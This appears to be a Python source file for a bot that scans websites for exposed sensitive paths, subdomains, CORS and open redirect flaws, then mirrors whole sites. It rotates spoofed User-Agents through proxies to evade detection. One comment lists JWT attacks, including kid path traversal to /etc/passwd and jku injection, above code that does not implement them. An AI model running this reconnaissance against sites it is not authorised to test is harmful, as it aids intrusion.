    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    # ── Edge — Windows ───────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    # ── Mobile — Android Chrome ──────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; RMX3890) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
    # ── Mobile — iOS Safari ──────────────────────────────────────────
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    # ── iPad ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    # ── Opera ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    # ── Brave (Chrome-based) ──────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    # ── Mobile Firefox ───────────────────────────────────────────────
    'Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0',
    # ── Samsung Internet ─────────────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36',
]


def _get_headers() -> dict:
    """Rotate User-Agent each call with realistic browser headers."""
    ua = random.choice(_UA_LIST)
    is_mobile = 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua or 'iPad' in ua
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5',
            'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8',
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        **({"Sec-CH-UA-Mobile": "?1"} if is_mobile else {"Sec-CH-UA-Mobile": "?0"}),
    }


def _get_page_fingerprint(url: str, timeout: int = 6) -> tuple:
    """
    Get (status_code, body_hash, content_length) for baseline comparison.
    Used to detect catch-all pages.
    """
    try:
        resp = requests.get(url, headers=_get_headers(), timeout=timeout,
                            stream=True, allow_redirects=True, verify=False,
                            proxies=proxy_manager.get_proxy())
        status = resp.status_code
        chunk  = b''
        for part in resp.iter_content(1024):
            chunk += part
            if len(chunk) >= 1024: break
        resp.close()
        body_hash = hashlib.md5(chunk[:512]).hexdigest()
        ct_length = int(resp.headers.get('Content-Length', len(chunk)))
        return status, body_hash, ct_length, resp.headers.get('Content-Type','')
    except Exception:
        return 0, '', 0, ''


def _detect_catchall(base_url: str) -> tuple:
    """
    Request a random non-existent path — if it returns 200,
    the server has a catch-all (Cloudflare, custom 404 as 200).
    Returns (is_catchall: bool, baseline_hash: str, baseline_len: int)
    """
    rand_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=16)) + '.html'
    status, body_hash, ct_len, ct = _get_page_fingerprint(base_url.rstrip('/') + rand_path)
    if status == 200:
        return True, body_hash, ct_len   # catch-all confirmed
    return False, '', 0


def _is_fake_200_content(body: bytes, ct: str) -> bool:
    if 'html' not in ct.lower():
        return False
    snippet = body[:800].lower()
    return any(s in snippet for s in _FAKE_SIGS)


def _probe_one(
    base_url: str, path: str, label: str, severity: str,
    catchall: bool, baseline_hash: str, baseline_len: int,
    delay: float = 0.0
) -> dict | None:
    """
    Probe one path — GET + stream.
    Compares against baseline to filter catch-all false positives.
    """
    if delay > 0:
        time.sleep(delay)

    full_url = base_url.rstrip('/') + path
    try:
        resp = requests.get(
            full_url, headers=_get_headers(),
            timeout=8, stream=True,
            allow_redirects=True, verify=False,
            proxies=proxy_manager.get_proxy(),
        )
        status = resp.status_code
        ct     = resp.headers.get('Content-Type', '')

        if status == 200:
            chunk = b''
            for part in resp.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            resp.close()

            # ── Catch-all filter ──────────────────
            if catchall:
                page_hash = hashlib.md5(chunk[:512]).hexdigest()
                page_len  = int(resp.headers.get('Content-Length', len(chunk)))
                # Same hash or very similar length = catch-all page
                if page_hash == baseline_hash:
                    return None
                if baseline_len > 0 and abs(page_len - baseline_len) < 50:
                    return None

            # ── Fake 200 (custom 404 HTML) ────────
            if _is_fake_200_content(chunk, ct):
                return None

            size = int(resp.headers.get('Content-Length', len(chunk)))
            return {
                "path": path, "full_url": full_url,
                "label": label, "severity": severity,
                "status": 200, "protected": False, "size": size,
            }

        elif status == 403 and severity in ("CRITICAL","HIGH"):
            resp.close()
            # Cloudflare 403 = file might exist but CF blocks it
            cf = 'cloudflare' in resp.headers.get('Server','').lower() or \
                 'cf-ray' in resp.headers
            note = " (CF-blocked)" if cf else ""
            return {
                "path": path, "full_url": full_url,
                "label": label + note, "severity": "MEDIUM",
                "status": 403, "protected": True, "size": 0,
            }

        elif status in (301,302,307,308):
            loc = resp.headers.get('Location','')
            resp.close()
            if severity in ("HIGH","MEDIUM","LOW") and any(
                k in loc for k in ('login','auth','signin','session')
            ):
                return {
                    "path": path, "full_url": full_url,
                    "label": label + " (→ login)",
                    "severity": severity, "status": status,
                    "protected": True, "size": 0,
                }

        else:
            try: resp.close()
            except: pass

    except requests.exceptions.Timeout:
        pass
    except Exception:
        pass
    return None


def _verify_subdomain_real(sub_url: str) -> bool:
    """
    A subdomain is 'real' only if:
    1. DNS resolves OK
    2. HTTP responds (any code)
    3. It has DIFFERENT content than a random path on SAME subdomain
       (i.e. not a Cloudflare/nginx catch-all that mirrors base domain)
    """
    try:
        hostname = urlparse(sub_url).hostname
        socket.gethostbyname(hostname)   # DNS must resolve
    except socket.gaierror:
        return False  # NXDOMAIN = not real

    # Check if it returns anything
    try:
        r = requests.get(sub_url, headers=_get_headers(), timeout=5,
                         proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False, stream=True)
        r.close()
        code = r.status_code
        if code >= 500:
            return False
    except Exception:
        return False

    # Verify it's NOT a catch-all mirror of the base domain
    is_catchall, _, _ = _detect_catchall(sub_url)
    # Even catch-all subdomains can be real services — just note it
    # We still include them but mark behavior
    return True


def _scan_target_sync(
    target_url: str, delay_per_req: float = 0.3
) -> tuple:
    """Scan one URL with catch-all detection and delays."""
    exposed   = []
    protected = []

    # Detect catch-all first
    catchall, baseline_hash, baseline_len = _detect_catchall(target_url)

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        fmap = {
            ex.submit(
                _probe_one, target_url, path, label, sev,
                catchall, baseline_hash, baseline_len,
                delay_per_req * (i % 5)   # stagger delays 0/0.3/0.6/0.9/1.2s
            ): (path, label, sev)
            for i, (path, label, sev) in enumerate(_VULN_PATHS)
        }
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            try:
                f = fut.result(timeout=15)
                if f:
                    (protected if f["protected"] else exposed).append(f)
            except Exception:
                pass

    exposed.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    protected.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    return exposed, protected, catchall


def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
    """
    Discover live subdomains — with real verification (not catch-all mirrors).
    """
    parsed = urlparse(base_url)
    scheme = parsed.scheme
    parts  = parsed.hostname.split('.')
    root   = '.'.join(parts[-2:]) if len(parts) > 2 else parsed.hostname

    progress_q.append(
        f"📡 Subdomain discovery...\n"
        f"Testing `{len(_COMMON_SUBDOMAINS)}` common names on `{root}`"
    )

    live = []

    def check_sub(sub):
        url = f"{scheme}://{sub}.{root}"
        if _verify_subdomain_real(url):
            return url
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_sub, sub): sub for sub in _COMMON_SUBDOMAINS}
        for fut in concurrent.futures.as_completed(futures, timeout=40):
            try:
                result = fut.result(timeout=8)
                if result:
                    live.append(result)
            except Exception:
                pass

    return live


def _vuln_scan_sync(url: str, progress_q: list, skip_subs: bool = False) -> dict:
    """Improved orchestrator — parallel targets + CORS + open redirect."""
    is_cloudflare = False
    results = {
        "url": url, "findings": [],
        "missing_headers": [], "clickjacking": False,
        "https": url.startswith("https://"),
        "server": "Unknown", "subdomains_found": [],
        "total_scanned": 0, "errors": 0,
        "cloudflare": False,
        "cors": {}, "open_redirects": [],
    }

    # ── Baseline headers ──────────────────────────
    progress_q.append("🔍 Checking security headers + CORS...")
    try:
        r0 = requests.get(
            url, timeout=10, headers=_get_headers(),
            proxies=proxy_manager.get_proxy(),
            allow_redirects=True, verify=False
        )
        hdrs = dict(r0.headers)
        srv  = hdrs.get("Server", "Unknown")
        results["server"] = srv[:60]
        is_cloudflare = "cloudflare" in srv.lower() or "cf-ray" in hdrs
        results["cloudflare"] = is_cloudflare

        for hdr, (name, sev) in _SEC_HEADERS.items():
            if hdr not in hdrs:
                results["missing_headers"].append((name, hdr, sev))
        if srv and any(c.isdigit() for c in srv):
            results["missing_headers"].append(
                ("Server version leak", f"Server: {srv[:50]}", "LOW"))
        xpb = hdrs.get("X-Powered-By", "")
        if xpb:
            results["missing_headers"].append(
                ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
        has_xfo = "X-Frame-Options" in hdrs
        has_fa  = "frame-ancestors" in hdrs.get("Content-Security-Policy", "")
        results["clickjacking"] = not has_xfo and not has_fa
    except Exception:
        results["errors"] += 1

    # ── CORS check ────────────────────────────────
    cors_result = _check_cors_misconfig(url)
    results["cors"] = cors_result
    if cors_result["vulnerable"]:
        sev = cors_result["severity"]
        progress_q.append(
            f"🚨 CORS misconfiguration — `{sev}`\n"
            f"ACAO: `{cors_result['acao']}`\n"
            f"Credentials: `{cors_result.get('acac','false')}`"
        )

    # ── Open redirect ─────────────────────────────
    progress_q.append("🔀 Testing open redirect payloads...")
    results["open_redirects"] = _check_open_redirect(url)
    if results["open_redirects"]:
        progress_q.append(
            f"🟠 Open redirect found — `{len(results['open_redirects'])}` params vulnerable"
        )

    req_delay   = 0.8 if is_cloudflare else 0.2
    if is_cloudflare:
        progress_q.append("☁️ *Cloudflare detected* — slower scan mode...")

    # ── Subdomain discovery ───────────────────────
    if not skip_subs:
        live_subs = _discover_subdomains_sync(url, progress_q)
        results["subdomains_found"] = live_subs
        if live_subs:
            progress_q.append(
                f"✅ *{len(live_subs)} subdomains found:*\n"
                + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
            )
        else:
            progress_q.append("📭 No live subdomains found")
    else:
        progress_q.append("⏭️ Subdomain scan skipped")

    # ── Parallel target scan ──────────────────────
    all_targets = [url] + results["subdomains_found"]
    progress_q.append(
        f"🔍 Scanning `{len(all_targets)}` target(s) in parallel..."
    )

    def _scan_one(target):
        exposed, protected, catchall = _scan_target_sync(target, req_delay)
        return {
            "target":    target,
            "netloc":    urlparse(target).netloc,
            "exposed":   exposed,
            "protected": protected,
            "catchall":  catchall,
        }

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(all_targets), 6)) as ex:
        futures = {ex.submit(_scan_one, t): t for t in all_targets}
        for fut in concurrent.futures.as_completed(futures, timeout=180):
            try:
                r = fut.result(timeout=30)
                results["total_scanned"] += len(_VULN_PATHS)
                if r["exposed"] or r["protected"]:
                    results["findings"].append(r)
                netloc = r["netloc"]
                exp_cnt = len(r["exposed"])
                if exp_cnt:
                    progress_q.append(f"🚨 `{netloc}` — `{exp_cnt}` exposed paths found")
            except Exception:
                results["errors"] += 1

    return results


# ── Also patch _format_vuln_report to show CORS + redirect ──────────
def _format_vuln_report(r: dict) -> str:
    domain = urlparse(r["url"]).netloc
    lines  = []

    total_exp = sum(len(f["exposed"]) for f in r["findings"])
    all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]

    cors_vuln = r.get("cors", {}).get("vulnerable", False)
    cors_sev  = r.get("cors", {}).get("severity", "")
    redirects = r.get("open_redirects", [])

    if "CRITICAL" in all_sevs or cors_sev == "CRITICAL": overall = "🔴 CRITICAL RISK"
    elif "HIGH" in all_sevs or redirects or cors_sev == "HIGH": overall = "🟠 HIGH RISK"
    elif "MEDIUM" in all_sevs or r["clickjacking"]: overall = "🟡 MEDIUM RISK"
    elif r["missing_headers"]: overall = "🔵 LOW RISK"
    else: overall = "✅ CLEAN"

    cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
    lines += [
        "🛡️ *Vulnerability Scan Report*",
        f"🌐 `{domain}`{cf_badge}",
        f"📊 Risk: *{overall}*",
        f"🔍 Paths: `{r['total_scanned']}` | Issues: `{total_exp}`",
        f"📡 Subdomains: `{len(r['subdomains_found'])}`",
        f"🖥️ Server: `{r['server']}`",
        "",
    ]

    # CORS result
    lines.append("*🌐 CORS Policy:*")
    if cors_vuln:
        sev = r["cors"]["severity"]
        em  = "🔴" if sev == "CRITICAL" else "🟠"
        lines.append(f"  {em} `{sev}` — {r['cors']['note']}")
        lines.append(f"  ACAO: `{r['cors']['acao']}`")
    else:
        lines.append("  ✅ No origin reflection")
    lines.append("")

    # Open redirect
    if redirects:
        lines.append(f"*🔀 Open Redirect:* `{len(redirects)}` params vulnerable")
        for rd in redirects[:3]:
            lines.append(f"  🟠 `?{rd['param']}=` → `{rd['location'][:60]}`")
        lines.append("")

    # Subdomains
    if r["subdomains_found"]:
        lines.append("*📡 Live Subdomains:*")
        for s in r["subdomains_found"]:
            lines.append(f"  • {s}")
        lines.append("")

    lines.append("*🔐 HTTPS:*")
    lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
    lines.append("")

    if r["findings"]:
        for f in r["findings"]:
            if f["exposed"]:
                lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
                for fi in f["exposed"]:
                    em   = _SEV_EMOJI.get(fi["severity"], "⚪")
                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']} `[{fi['status']}]`")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
            if f["protected"]:
                lines.append(f"*⚠️ Gated (401/403) — `{f['netloc']}`:*")
                for fi in f["protected"][:5]:
                    em = _SEV_EMOJI.get(fi["severity"], "⚪")
                    lines.append(f"  {em} {fi['label']}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
    else:
        lines += ["*✅ No exposed files found*", ""]

    lines.append("*🖼️ Clickjacking:*")
    if r["clickjacking"]:
        lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
    else:
        lines.append("  ✅ Protected")
    lines.append("")

    if r["missing_headers"]:
        lines.append("*📋 Security Header Issues:*")
        for name, hdr, sev in r["missing_headers"][:8]:
            em = _SEV_EMOJI.get(sev, "⚪")
            if "leak" in name.lower() or "disclosure" in name.lower():
                lines.append(f"  {em} {name}: `{hdr}`")
            else:
                lines.append(f"  {em} Missing *{name}*")
        lines.append("")

    lines += [
        "━━━━━━━━━━━━━━━━━━",
        "⚠️ _Passive scan only — no exploitation_",
    ]
    return "\n".join(lines)


# ───────────────────────────────────────────────────────────────────
# [2] REPLACE JWT functions (original: lines ~5482–5600)
#     IMPROVEMENTS:
#       + kid path traversal injection (/etc/passwd, SQLi)
#       + JWKS endpoint spoof detection + jku/x5u injection
#       + exp=9999999999 timestamp forgery
#       + Parallel brute-force (ThreadPoolExecutor)
#       + All-in-one combined attack report
# ───────────────────────────────────────────────────────────────────

def download_website(
    base_url: str,
    full_site: bool,
    use_js: bool,
    max_pages: int,
    max_assets: int,
    progress_cb=None,
    resume: bool = False,
) -> tuple:

    domain     = urlparse(base_url).netloc
    safe       = re.sub(r'[^\w\-]','_', domain)
    domain_dir = os.path.join(DOWNLOAD_DIR, safe)
    os.makedirs(domain_dir, exist_ok=True)

    state       = load_resume(base_url) if resume else {"visited":[],"downloaded":[],"assets":[],"stats":{}}
    visited     = set(state["visited"])
    dl_done     = set(state["downloaded"])
    known_assets= set(state["assets"])
    stats = state.get("stats") or {'pages':0,'assets':0,'failed':0,'size_kb':0}

    session = requests.Session()
    session.headers.update(_get_headers())

    # ── Attach proxy to session if available ──────
    _px = proxy_manager.get_proxy()
    if _px:
        session.proxies.update(_px)

    # ── Phase 0: Sitemap discovery ───────────────
    queue: list = [base_url]   # ← FIX: initialize before sitemap section
    if full_site and not resume:
        if progress_cb: progress_cb("🗺️ Sitemap ရှာနေပါတယ်...")
        sitemap_urls = fetch_sitemap(base_url)
        if sitemap_urls:
            stats['sitemap_urls'] = len(sitemap_urls)
            if progress_cb:
                progress_cb("🗺️ Sitemap: `%d` URLs တွေ့ပြီ" % len(sitemap_urls))
            for u in list(sitemap_urls)[:max_pages]:
                if u not in visited and u not in queue:
                    queue.append(u)

    # ── Phase 1: Pages ──────────────────────────
    queue = list(dict.fromkeys(queue))
    queue = [u for u in queue if u not in visited]

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited: continue

        # SSRF check per link
        safe_ok, reason = is_safe_url(url)
        if not safe_ok:
            log_warn(url, f"SSRF blocked: {reason}")
            stats['failed'] += 1
            visited.add(url)
            continue

        visited.add(url)
        html, js_used = fetch_page(url, use_js)
        if html is None:
            stats['failed'] += 1
            continue

        local = safe_local_path(domain_dir, url)
        try:
            with open(local,'w',encoding='utf-8',errors='replace') as f:
                f.write(html)
            stats['pages'] += 1
        except Exception:
            stats['failed'] += 1
            continue

        known_assets |= extract_assets(html, url)
        if full_site:
            for link in get_internal_links(html, url):
                if link not in visited:
                    queue.append(link)

        if stats['pages'] % 5 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb:
            bar = pbar(stats['pages'], max(len(visited), 1))
            progress_cb(
                f"📄 *Pages*\n`{bar}`\n"
                f"`{stats['pages']}` pages | `{len(known_assets)}` assets"
                + (" ⚡JS" if js_used else "")
            )

    # ── Phase 2: Assets ─────────────────────────
    asset_list   = [a for a in list(known_assets)[:max_assets] if a not in dl_done]
    total_assets = len(asset_list) + len(dl_done)
    extra_css    = set()
    max_bytes    = MAX_ASSET_MB * 1024 * 1024

    for i, asset_url in enumerate(asset_list):
        dl_done.add(asset_url)

        # SSRF check per asset
        safe_ok, reason = is_safe_url(asset_url)
        if not safe_ok:
            log_warn(asset_url, f"Asset SSRF blocked: {reason}")
            stats['failed'] += 1
            continue

        try:
            resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()

            # ── File size limit (DoS prevention) ──
            cl = resp.headers.get('Content-Length')
            if cl and int(cl) > max_bytes:
                log_warn(asset_url, f"Asset too large: {int(cl)//1024//1024}MB — skipped")
                stats['failed'] += 1
                continue

            content      = b''
            size_exceeded = False
            for chunk in resp.iter_content(8192):
                content += chunk
                if len(content) > max_bytes:
                    size_exceeded = True
                    break
            if size_exceeded:
                log_warn(asset_url, "Asset size limit exceeded mid-stream — skipped")
                stats['failed'] += 1
                continue

            local = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets'] += 1
            stats['size_kb'] += len(content)/1024

            ct = resp.headers.get('Content-Type','')
            if 'css' in ct or asset_url.lower().endswith('.css'):
                extra_css |= extract_css_assets(content.decode('utf-8','replace'), asset_url)
            # ── Mine JS bundles for media URLs ────
            if 'javascript' in ct or asset_url.lower().endswith('.js'):
                js_media = extract_media_from_js(content.decode('utf-8','replace'), base_url)
                known_assets |= js_media

        except Exception as e:
            stats['failed'] += 1

        if i % 30 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb and i % 10 == 0:
            bar = pbar(len(dl_done), total_assets)
            progress_cb(
                f"📦 *Assets*\n`{bar}`\n"
                f"`{stats['assets']}` done | `{stats['size_kb']/1024:.1f}` MB"
            )

    # ── Phase 3: CSS nested assets ──────────────
    for asset_url in list(extra_css - dl_done)[:200]:
        safe_ok, _ = is_safe_url(asset_url)
        if not safe_ok: continue
        try:
            resp    = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()
            content = b''.join(resp.iter_content(8192))
            if len(content) > max_bytes: continue
            local   = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets']  += 1
            stats['size_kb'] += len(content)/1024
        except Exception:
            stats['failed'] += 1

    # ── Phase 4: ZIP ─────────────────────────────
    if progress_cb: progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")

    zip_path = os.path.join(DOWNLOAD_DIR, f"{safe}.zip")
    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
        for root,dirs,files in os.walk(domain_dir):
            for file in files:
                fp = os.path.join(root,file)
                zf.write(fp, os.path.relpath(fp, DOWNLOAD_DIR))

    shutil.rmtree(domain_dir, ignore_errors=True)
    clear_resume(base_url)

    size_mb = os.path.getsize(zip_path)/1024/1024

    if needs_split(zip_path):
        if progress_cb: progress_cb(f"✂️ {size_mb:.1f}MB split လုပ်နေပါတယ်...")
        parts = split_zip(zip_path)
        os.remove(zip_path)
        return parts, None, stats, size_mb
    return [zip_path], None, stats, size_mb


# ══════════════════════════════════════════════════
# 🔬  FEATURE 1 — /tech  Tech Stack Fingerprinter
# ══════════════════════════════════════════════════

_TECH_SIGNATURES = {
    # ── CMS ──────────────────────────────────────────
    "WordPress":             [r'wp-content/', r'wp-includes/', r'wordpress', r'wp-json/'],
    "WordPress+WooCommerce": [r'woocommerce', r'wc-api/', r'wc/v3/'],
    "Drupal":                [r'Drupal\.settings', r'/sites/default/files/', r'drupal\.js'],
    "Joomla":                [r'/media/joomla_', r'Joomla!', r'/components/com_'],
    "Ghost CMS":             [r'ghost\.io', r'/ghost/api/', r'content-api\.ghost\.org'],
    "Shopify":               [r'cdn\.shopify\.com', r'Shopify\.theme', r'myshopify\.com'],
    "Magento":               [r'Mage\.', r'/skin/frontend/', r'mage/cookies'],
    "Prestashop":            [r'prestashop', r'/modules/blockcart/'],
    "OpenCart":              [r'route=common/home', r'openCart'],
    "TYPO3":                 [r'typo3/', r'typo3conf/'],
    "Wix":                   [r'wix\.com', r'static\.parastorage\.com', r'wixstatic\.com'],
    "Squarespace":           [r'squarespace\.com', r'static1\.squarespace'],
    "Webflow":               [r'webflow\.com', r'uploads-ssl\.webflow'],
    "Contentful":            [r'contentful\.com', r'ctfassets\.net'],
    "Strapi":                [r'strapi', r'/admin/strapi'],
    "Craft CMS":             [r'craft-csrf-token', r'/cpresources/'],
    "HubSpot CMS":           [r'hubspot\.com/hs/', r'js\.hs-scripts'],
    "Sitecore":              [r'sitecore', r'/sitecore/shell/'],
    "Umbraco":               [r'umbraco', r'/umbraco/api/'],
    # ── JS Frameworks ────────────────────────────────
    "Next.js":               [r'__NEXT_DATA__', r'/_next/static/', r'next/dist/'],
    "Nuxt.js":               [r'__NUXT__', r'/_nuxt/', r'nuxt\.min\.js'],
    "React":                 [r'__reactFiber', r'react-dom\.production', r'react\.development'],
    "Vue.js":                [r'__vue__', r'data-v-[a-f0-9]+', r'vue\.runtime'],
    "Angular":               [r'ng-version=', r'angular\.min\.js', r'ng-app='],
    "Svelte":                [r'__svelte', r'svelte-', r'svelte/internal'],
    "Gatsby":                [r'___gatsby', r'/gatsby-', r'gatsby-config'],
    "Remix":                 [r'__remixContext', r'@remix-run'],
    "Astro":                 [r'astro-island', r'astro:page-load'],
    "SvelteKit":             [r'__sveltekit_', r'_app/immutable/'],
    "Ember.js":              [r'ember-application', r'Ember\.VERSION'],
    "Alpine.js":             [r'x-data=', r'alpinejs'],
    "HTMX":                  [r'hx-get=', r'hx-post=', r'htmx\.org'],
    "Stimulus":              [r'stimulus', r'data-controller='],
    "Inertia.js":            [r'inertia', r'@inertiajs/'],
    # ── JS Libraries ─────────────────────────────────
    "jQuery":                [r'jquery\.min\.js', r'jquery-[0-9]'],
    "Bootstrap":             [r'bootstrap\.min\.css', r'bootstrap\.min\.js'],
    "Tailwind CSS":          [r'tailwindcss', r'cdn\.tailwindcss\.com'],
    "Lodash":                [r'lodash\.min\.js', r'_\.chunk\('],
    "Axios":                 [r'axios\.min\.js', r'axios\.create\('],
    "D3.js":                 [r'd3\.min\.js', r'd3-selection'],
    "Chart.js":              [r'chart\.min\.js', r'Chart\.register'],
    # ── Servers ──────────────────────────────────────
    "Nginx":                 [r'server:\s*nginx'],
    "Apache":                [r'server:\s*apache'],
